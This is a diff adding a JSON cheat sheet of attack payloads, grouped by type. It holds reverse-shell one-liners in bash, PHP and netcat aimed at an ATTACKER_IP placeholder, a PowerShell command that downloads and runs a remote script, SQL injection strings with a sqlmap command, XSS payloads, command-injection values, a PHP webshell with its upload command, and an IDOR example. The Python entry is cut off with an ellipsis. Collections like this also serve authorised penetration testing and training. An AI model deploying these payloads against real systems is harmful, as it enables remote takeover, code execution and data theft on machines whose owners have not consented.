@@ -1,0 +1,84 @@
+{
+  "Reverse Shells": [
+    {
+      "type": "bash",
+      "payload": "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
+      "examples": [
+        "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
+      ]
+    },
+    {
+      "type": "python",
+      "payload": "python3 -c 'import socket,subprocess,os;...'",
+      "examples": [
+        "python3 -c 'import socket,subprocess,os;..."
+      ]
+    },
+    {
+      "type": "php",
+      "payload": "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "examples": []
+    },
+    {
+      "type": "powershell",
+      "payload": "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')",
+      "examples": []
+    }
+  ],
+  "SQL Injection": [
+    {
+      "type": "basic",
+      "payload": "' OR 1=1 --",
+      "examples": [
+        "sqlmap -u 'http://target/page.php?id=1' --dbs"
+      ]
+    },
+    {
+      "type": "union",
+      "payload": "UNION SELECT NULL, version() --",
+      "examples": []
+    }
+  ],
+  "XSS": [
+    {
+      "type": "script",
+      "payload": "<script>alert(1)</script>",
+      "examples": []
+    },
+    {
+      "type": "img",
+      "payload": "<img src=x onerror=alert(1)>",
+      "examples": []
+    }
+  ],
+  "Command Injection": [
+    {
+      "type": "simple",
+      "payload": "; whoami",
+      "examples": [
+        "curl http://target?cmd=whoami"
+      ]
+    },
+    {
+      "type": "nc",
+      "payload": "| nc -e /bin/sh ATTACKER_IP PORT",
+      "examples": []
+    }
+  ],
+  "File Upload": [
+    {
+      "type": "php webshell",
+      "payload": "<?php system($_GET['cmd']); ?>",
+      "examples": [
+        "curl -F 'file=@shell.php' http://target/upload"
+      ]
+    }
+  ],
+  "Logic Attacks": [
+    {
+      "type": "IDOR",
+      "payload": "user?id=1 \u2192 user?id=2",
+      "examples": []
+    }
+  ]
+}
